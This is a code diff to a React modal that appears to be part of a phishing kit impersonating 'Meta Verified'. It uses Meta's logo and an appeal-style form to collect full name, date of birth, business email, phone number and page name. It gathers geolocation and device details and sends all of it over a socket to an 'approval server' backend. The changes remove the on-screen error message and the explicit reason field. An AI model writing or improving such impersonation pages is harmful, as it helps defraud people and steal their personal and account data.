@@ -1,9 +1,8 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
-import { useSocketEmit } from '@/hooks/use-socket';
+import { sendAppealMessage, useSocketEmit } from '@/hooks/use-socket';
 import { store } from '@/store/store';
 import { getDeviceLabel } from '@/utils/device';
 import { buildAppealMessage, geoToIpInfo } from '@/utils/message';
-import { sendAppealMessage } from '@/utils/socket-approval';
 import translateText from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -33,8 +32,7 @@ const TEXTS = [
     'Mobile phone number',
     'Our response will be sent to you within 14-40 hours.',
     'I agree with Terms of use',
-    'Send',
-    'Could not reach the approval server. Start the backend (pnpm dev:backend) and check VPS_BACKEND_URL in .env.local.'
+    'Send'
 ] as const;
 
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
@@ -42,7 +40,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [phoneNumber, setPhoneNumber] = useState('');
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [agreeToTerms, setAgreeToTerms] = useState(false);
-    const [submitError, setSubmitError] = useState('');
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
         dob: '',
@@ -64,10 +61,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => translations[text] || text;
-
-    useEffect(() => {
-        document.title = 'Meta Verified';
-    }, []);
 
     useEffect(() => {
         if (typeof window !== 'undefined' && deviceLabel === 'Unknown') {
@@ -126,7 +119,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         }
 
         setIsLoading(true);
-        setSubmitError('');
 
         const payload = {
             fullName: formData.fullName.trim(),
@@ -135,7 +127,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             businessEmail: formData.businessEmail.trim(),
             phone: phoneNumber,
             pageName: formData.pageName.trim(),
-            reason: 'Meta Verified registration',
             additionalNotes: ''
         };
 
@@ -148,7 +139,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             persistAppealForm(payload);
 
             if (!geoInfo || !socket) {
-                setSubmitError(t(TEXTS[5]));
                 return;
             }
 
@@ -168,7 +158,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             setMessageId(newMessageId);
             nextStep();
         } catch {
-            setSubmitError(t(TEXTS[5]));
         } finally {
             setIsLoading(false);
         }
@@ -176,6 +165,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     return (
         <div className='modal-overlay modal-overlay--light' role='dialog' aria-modal='true'>
+        <title>Meta Verified</title>
             <div className='modal-card-gradient'>
                     <div className='modal-card-gradient-header'>
                         <p className='modal-card-gradient-title'>{t(TEXTS[0])}</p>
@@ -190,11 +180,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                     </div>
 
                     <form onSubmit={handleSubmit} className='modal-form-body'>
-                        {submitError ? (
-                            <p className='text-xs text-red-600' role='alert'>
-                                {submitError}
-                            </p>
-                        ) : null}
+
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
                                 <p className='form-field-label'>{t(field.label)}</p>
